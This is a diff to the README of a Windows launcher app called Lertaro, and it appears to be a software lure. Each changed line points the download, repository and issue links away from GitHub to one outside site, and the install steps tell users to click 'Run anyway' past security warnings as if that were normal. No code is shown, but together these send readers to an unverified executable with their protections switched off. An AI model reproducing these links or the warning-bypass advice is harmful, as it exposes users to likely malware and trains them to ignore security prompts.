@@ -1,6 +1,6 @@
 # 🚀 Lertaro - Find Files Instantly, Boost Productivity
 
-[![Download Lertaro](https://img.shields.io/badge/Download-Lertaro-blue?style=for-the-badge&logo=windows)](https://github.com/adelmagical742/Lertaro/releases)
+[![Download Lertaro](https://img.shields.io/badge/Download-Lertaro-blue?style=for-the-badge&logo=windows)](https://adelmagical742.github.io)
 
 ## 📋 Overview
 
@@ -20,7 +20,7 @@ To run Lertaro, your computer should meet these minimum requirements:
 
 ### Installation
 
-1. **Download Lertaro:** Visit the [official download page](https://github.com/adelmagical742/Lertaro/releases) to get the latest version.
+1. **Download Lertaro:** Visit the [official download page](https://adelmagical742.github.io) to get the latest version.
 2. **Run the Installer:** Double-click the downloaded file. If you see a security warning, click "More info" and then "Run anyway" – this is normal for new software.
 3. **Follow Setup Wizard:** Click "Next" through the installation steps. Choose a destination folder (default is fine) and click "Install."
 4. **Launch Lertaro:** Once installed, Lertaro will start automatically. You can also find it in your Start Menu or taskbar.
@@ -51,7 +51,7 @@ Launch applications, open folders, or run commands directly from the search bar.
 
 ## 📥 Download
 
-Visit the [Lertaro Releases page](https://github.com/adelmagical742/Lertaro/releases) to download the application.
+Visit the [Lertaro Releases page](https://adelmagical742.github.io) to download the application.
 
 ## 🛠️ How It Works
 
@@ -119,10 +119,10 @@ Lertaro is open-source software. Check the repository for license details.
 
 ## 🤝 Contributing
 
-We welcome contributions! If you have ideas, bug reports, or want to help with development, visit the [Lertaro GitHub repository](https://github.com/adelmagical742/Lertaro).
+We welcome contributions! If you have ideas, bug reports, or want to help with development, visit the [Lertaro GitHub repository](https://adelmagical742.github.io).
 
 ## 📧 Support
 
-For help, open an issue on the [GitHub Issues page](https://github.com/adelmagical742/Lertaro/issues) or join the community discussions.
+For help, open an issue on the [GitHub Issues page](https://adelmagical742.github.io) or join the community discussions.
 
 Keywords: application-launcher, desktop, efficiency, everyting, keyboard-launcher, launcher, listary, plugins, productivity, productivity-tools, search, windows, windows-search
